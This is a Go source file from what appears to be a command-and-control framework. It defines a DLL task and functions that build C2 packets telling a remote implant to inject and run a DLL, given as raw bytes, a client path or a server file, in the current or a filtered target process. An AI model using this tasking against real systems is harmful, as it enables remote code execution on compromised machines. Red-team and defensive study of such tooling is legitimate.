package wintask

import (
	"io"
	"os"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
)

// DLL is a struct that is similar to the 'cmd.DLL' struct. This is used to Task
// a Client with loading a DLL on Windows devices. This struct has many of the
// functionallies of the standard 'cmd.DLL' struct.
//
// The 'SetParent' function will attempt to set the target that runs the DLL.
// If none are specified, the DLL will be injected into the current process.
//
// The Path parameter is the path (on the client) where the DLL is located. Name may be omitted and Data
// can be filled with the raw binary data to send and load a DLL instead.
type DLL struct {
	Filter *cmd.Filter

	Path string
	Data []byte
	Wait bool
}

// InjectDLL will create a Task that will instruct the client to run the raw
// DLL bytes.
//
// This command will run under the current process and will wait until completion.
// Use the 'InjectEx' function instead to change this behavior.
//
// C2 Details:
//  ID: WvInjectDLL
//
//  Input:
//      - wintask.DLL struct
//        - string (Path)
//        - bool (Wait)
//        - bool (Filer != nil)
//        - Filter
//        - []byte (Data)
//  Output:
//      - uint64 (handle)
//      - uint32 (pid)
//      - int32 (exit code)
func InjectDLL(b []byte) *com.Packet {
	return InjectDLLEx(&DLL{Data: b})
}

// InjectDLLEx will create a Task that will instruct the client to run the DLL
// and options specified in the DLL struct.
//
// C2 Details:
//  ID: WvInjectDLL
//
//  Input:
//      - wintask.DLL struct
//        - string (Path)
//        - bool (Wait)
//        - bool (Filer != nil)
//        - Filter
//        - []byte (Data)
//  Output:
//      - uint64 (handle)
//      - uint32 (pid)
//      - int32 (exit code)
func InjectDLLEx(d *DLL) *com.Packet {
	if d == nil {
		return nil
	}
	n := &com.Packet{ID: WvInjectDLL}
	d.MarshalStream(n)
	return n
}

// InjectDLLPath will create a Task that will instruct the client to run a DLL
// from a file source on the remote (client) machine.
//
// The target path may contain environment variables that will be resolved during
// runtime.
//
// This command will run under the current process and will wait until completion.
// Use the 'InjectEx' function instead to change this behavior.
//
// C2 Details:
//  ID: WvInjectDLL
//
//  Input:
//      - wintask.DLL struct
//        - string (Path)
//        - bool (Wait)
//        - bool (Filer != nil)
//        - Filter
//        - []byte (Data)
//  Output:
//      - uint64 (handle)
//      - uint32 (pid)
//      - int32 (exit code)
func InjectDLLPath(s string) *com.Packet {
	return InjectDLLEx(&DLL{Path: s})
}

// MarshalStream writes the data for this DLL task to the supplied Writer.
func (d *DLL) MarshalStream(w data.Writer) error {
	if err := w.WriteString(d.Path); err != nil {
		return err
	}
	if err := w.WriteBool(d.Wait); err != nil {
		return err
	}
	if d.Filter != nil {
		if err := w.WriteBool(true); err != nil {
			return err
		}
		if err := d.Filter.MarshalStream(w); err != nil {
			return err
		}
	} else {
		if err := w.WriteBool(false); err != nil {
			return err
		}
	}
	if err := w.WriteBytes(d.Data); err != nil {
		return err
	}
	return nil
}

// InjectDLLFile will create a Task that will instruct the client to run a DLL
// from a file source on the local (server) machine.
//
// The source path may contain environment variables that will be resolved on
// server execution.
//
// This command will run under the current process and will wait until completion.
// Use the 'InjectEx' function instead to change this behavior.
//
// C2 Details:
//  ID: WvInjectDLL
//
//  Input:
//      - wintask.DLL struct
//        - string (Path)
//        - bool (Wait)
//        - bool (Filer != nil)
//        - Filter
//        - []byte (Data)
//  Output:
//      - uint64 (handle)
//      - uint32 (pid)
//      - int32 (exit code)
func InjectDLLFile(s string) (*com.Packet, error) {
	b, err := os.ReadFile(s)
	if err != nil {
		return nil, err
	}
	return InjectDLL(b), nil
}

// UnmarshalStream reads the data for this DLL task from the supplied Reader.
func (d *DLL) UnmarshalStream(r data.Reader) error {
	if err := r.ReadString(&d.Path); err != nil {
		return err
	}
	if err := r.ReadBool(&d.Wait); err != nil {
		return err
	}
	if f, err := r.Bool(); err != nil {
		return err
	} else if f {
		d.Filter = new(cmd.Filter)
		if err = d.Filter.UnmarshalStream(r); err != nil {
			return err
		}
	}
	if err := r.ReadBytes(&d.Data); err != nil {
		return err
	}
	return nil
}

// InjectDLLReader will create a Task that will instruct the client to run a DLL
// from a reader source machine.
//
// This command will run under the current process and will wait until completion.
// Use the 'InjectEx' function instead to change this behavior.
//
// C2 Details:
//  ID: WvInjectDLL
//
//  Input:
//      - wintask.DLL struct
//        - string (Path)
//        - bool (Wait)
//        - bool (Filer != nil)
//        - Filter
//        - []byte (Data)
//  Output:
//      - uint64 (handle)
//      - uint32 (pid)
//      - int32 (exit code)
func InjectDLLReader(r io.Reader) (*com.Packet, error) {
	b, err := io.ReadAll(r)
	if err != nil {
		return nil, err
	}
	return InjectDLL(b), nil
}
